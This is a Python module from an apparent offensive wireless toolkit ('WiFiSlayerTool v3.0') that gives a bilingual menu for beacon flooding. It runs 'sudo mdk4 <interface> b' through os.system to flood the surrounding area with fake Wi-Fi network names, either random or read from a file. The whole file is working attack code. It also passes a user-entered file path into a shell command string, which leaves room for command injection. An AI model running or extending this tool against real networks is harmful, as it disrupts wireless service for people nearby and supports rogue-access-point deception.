# -*- coding: utf-8 -*-
"""
WiFiSlayerTool v3.0 — Beacon Flooding Module
Flood area with fake WiFi APs using mdk4.
"""

import os

from core.logger import log
from core.ui import (
    console, print_section, print_success, print_error,
    print_warning, print_info, select_interface, print_sub_menu,
    confirm_action,
)
from core.validator import safe_input, validate_file_path
from core.network import get_wireless_interfaces, enable_monitor_mode
from core.ascii_art import print_flood_art
from config import get_text


def flood_menu(current_interface=None):
    """Beacon Flooding sub-menu."""
    while True:
        console.print()
        if get_text("choose") == "اختر":
            options = [
                ("1", "🌪️", "إغراق بأسماء شبكات عشوائية (Random Flood)"),
                ("2", "📄", "إغراق بأسماء من ملف (File Flood)"),
            ]
        else:
            options = [
                ("1", "🌪️", "Random SSID Flood"),
                ("2", "📄", "SSID Flood from File"),
            ]

        title = "🌪️ " + "Beacon Flooding (mdk4)"
        print_sub_menu(title, options)

        choice = console.input(f"\n  [bold bright_cyan]➤ {get_text('choose')}:[/] ").strip()

        if choice == "1":
            beacon_flood(current_interface, mode="random")
        elif choice == "2":
            beacon_flood(current_interface, mode="file")
        elif choice == "0":
            break
        else:
            print_error(get_text("invalid_choice"))


def beacon_flood(interface=None, mode="random"):
    """Flood the area with fake SSIDs using mdk4."""
    os.system("clear" if os.name != "nt" else "cls")
    print_flood_art()
    print_section("Beacon Flooding")

    if not interface:
        interfaces = get_wireless_interfaces()
        interface = select_interface(interfaces)
        if not interface:
            print_error(get_text("no_interface"))
            return

    cmd = f"sudo mdk4 {interface} b"

    if mode == "file":
        from core.validator import safe_input, validate_file_path
        wordlist = safe_input(get_text("enter_wordlist"), validate_file_path, console)
        if not wordlist:
            return
        cmd += f" -f '{wordlist}'"
    else:
        # Default random flood (no args needed for basic mdk4 beacon flood)
        pass

    print_warning(get_text("flood_warning"))
    print_warning(f"Interface: [bold]{interface}[/]")
    console.print()

    if not confirm_action(get_text("confirm_attack")):
        return

    log.info(f"Starting Beacon Flood (Mode: {mode}) on {interface}")
    print_info(f"{get_text('flooding_started')} {get_text('press_ctrl_c')}")
    console.print()

    try:
        os.system(cmd)
    except KeyboardInterrupt:
        console.print()
        print_info(get_text("flooding_stopped"))

    log.info("Beacon Flood stopped")
